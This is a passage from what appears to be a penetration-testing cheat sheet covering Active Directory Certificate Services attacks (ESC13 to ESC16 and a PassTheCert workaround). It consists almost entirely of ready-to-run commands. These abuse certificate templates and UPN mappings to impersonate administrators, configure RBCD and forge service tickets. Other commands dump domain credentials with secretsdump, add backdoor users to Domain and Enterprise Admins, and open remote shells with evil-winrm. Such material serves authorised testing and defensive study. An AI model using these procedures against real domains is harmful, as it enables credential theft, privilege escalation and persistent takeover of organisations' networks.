```console
certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' -upn '<UPN>' update
```

#### 4. Get LDAP Shell

```console
certipy-ad auth -pfx '<DC_HOSTNAME>.pfx' -dc-ip '<DC_IP>' -ldap-shell
```

#### 5. Set RBCD

```console
set_rbcd <DC_HOSTNAME>$ <USER>
```

#### 6. Get a Service Ticket

```console
# Password
impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console
# NTLM
impacket-getST '<DOMAIN>/<USER>' -hashes ':<HASH>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
```

```console
export KRB5CCNAME='<DC_HOSTNAME>@ldap_<DC>@<DOMAIN>.ccache'
```

#### 7. Secretsdump

```console
impacket-secretsdump -k -no-pass <DC>
```

{{< /tabcontent >}}

---

### ESC13: Issuance Policy with Privileged Group Linked

{{< tab set12 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set12 tab1 >}}

#### 1. Request a Cert of User

```console
# Password
certipy-ad req -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -ca <CA> -template <VULN_TEMPLATE>
```

```console
# NTLM
certipy-ad req -username '<USER>@<DOMAIN>' -hashes <HASH> -ca <CA> -template <VULN_TEMPLATE>
```

#### 2. Get a TGT

```console
certipy-ad auth -pfx '<USER>.pfx' -dc-ip '<DC_IP>'
```

{{< /tabcontent >}}

---

### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)

{{< tab set13 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set13 tab1 >}}

#### 1. Create a Computer

```console
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> add computer evilcomputer '<NEW_PASSWORD>'
```

#### 2. Request a Cert of the Computer

```console
certipy-ad req -u 'evilcomputer$' -p '<NEW_PASSWORD>' -target <DC> -dc-ip <DC_IP> -ca <CA> -template Machine 
```

#### 3. Convert .pfx to .crt

```console
certipy-ad cert -pfx evilcomputer.pfx -nokey -out "evilcomputer.crt" 
```

#### 4. Inspect Serial Number and Issuer

```console
openssl x509 -in evilcomputer.crt -noout -text
```

#### 5. Convert to X509 Issuer SerialNumber Format

```console
python3 conv.py -serial '<SERIAL_NUMBER>' -issuer '<ISSUER>'
```

#### 6. Update Attribute (From Windows)

```console
$map = '<X509_ISSUER_SERIAL_NUMBER_FORMAT>'
```

```console
Set-ADUser <TARGET_USER> -Replace @{altSecurityIdentities=$map}
```

#### 7. Get NTLM Hash

```console
certipy-ad auth -pfx evilcomputer.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username '<TARGET_USER>'
```

<small>*Ref: [conv.py](https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities)*</small>

{{< /tabcontent >}}

---

### ESC14b: Weak Explicit Certificate Mapping (E-Mail)

{{< tab set14 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set14 tab1 >}}

#### 1. Modify Email of Target User

```console
# Password
bloodyAD -u '<USER>' -p ':<HASH>' -d <DOMAIN> -f rc4 --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
```

#### 2. Request a Cert

```console
# NTLM
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<DC_IP>' -ca '<CA>' -template '<TEMPLATE>'
```

#### 3. Get NTLM Hash

```console
certipy-ad auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username <TARGET_USER>
```

{{< /tabcontent >}}

---

### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")

{{< tab set15 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set15 tab1 >}}

#### 1. Lookup SID

```console
# Password
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
```

```console
# NTLM
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'cert_admin@example.com' -hashes 'f87---[SNIP]---773' -target 'dc01.example.com' -dc-ip '10.10.10.10' -user 'administrator' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=example,DC=com
    name                                : Administrator
    objectSid                           : S-1-5-21-1---[SNIP]---7-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T00:01:41+00:00
    whenChanged                         : 2025-07-14T11:03:29+00:00
```

#### 2. Inject "Client Authentication" Application Policy and Target UPN

```console
# Password
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

```console
# NTLM
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
```

#### 3. Spawn LDAP Shell

```console
certipy-ad auth -pfx 'administrator.pfx' -domain <DOMAIN> -dc-ip <DC_IP> -ldap-shell
```

#### 4. Persistence

```console
# Add New User
add_user <NEW_USER>
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> Administrators
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> 'Domain Admins'
```

```console
# Add New User to Group
add_user_to_group <NEW_USER> 'Enterprise Admins'
```

```console
# Add RDP
add_user_to_group <NEW_USER> 'Remote Desktop Users'
```

```console
# Add Winrm
add_user_to_group <NEW_USER> 'Remote Management Users'
```

{{< /tabcontent >}}

---

### ESC16: Security Extension Disabled on CA (Globally)

{{< tab set16 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set16 tab1 >}}

#### 1. Read Initial UPN of the Victim Account \[Optional\]

```console
# Password
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

#### 2. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)

```console
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -upn 'administrator' -user '<TARGET_USER>' update
```

#### 3. Request a Cert as the Victim from Any Suitable Client Authentication Template

```console
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -dc-ip <DC_IP> -target '<DC>' -ca '<CA>' -template 'User'
```

#### 4. Revert

```console
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -upn '<TARGET_USER_UPN>' -user '<TARGET_USER>' update
```

#### 5. Get NTLM Hash

```console
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain <DOMAIN> -dc-ip <DC_IP>
```

{{< /tabcontent >}}

---

### Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP

#### 1. Create Key and Cert from pfx

```console
certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
```

```console
certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
```

{{< tab set17 tab1 >}}LDAP Shell{{< /tab >}}
{{< tab set17 tab2 >}}RBCD{{< /tab >}}
{{< tabcontent set17 tab1 >}}

#### 1. Get a LDAP Shell

```console
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt '<USER>.crt' -key '<USER>.key' -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Add User to Administrators Group

```console
add_user_to_group '<USER>' administrators
```

#### 3. Remote

```console
evil-winrm -i <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>'
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}
{{< tabcontent set17 tab2 >}}

#### 1. RBCD Attack

```console
python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Request a Service Ticket

```console
sudo ntpdate -s <DC_IP> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
```

#### 3. Secrets Dump

```console
export KRB5CCNAME=Administrator.ccache
```

```console
impacket-secretsdump '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass -just-dc-ntlm
```

#### 5. Remote

```console
evil-winrm -i <TARGET_DOMAIN> -u administrator -H <HASH>
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}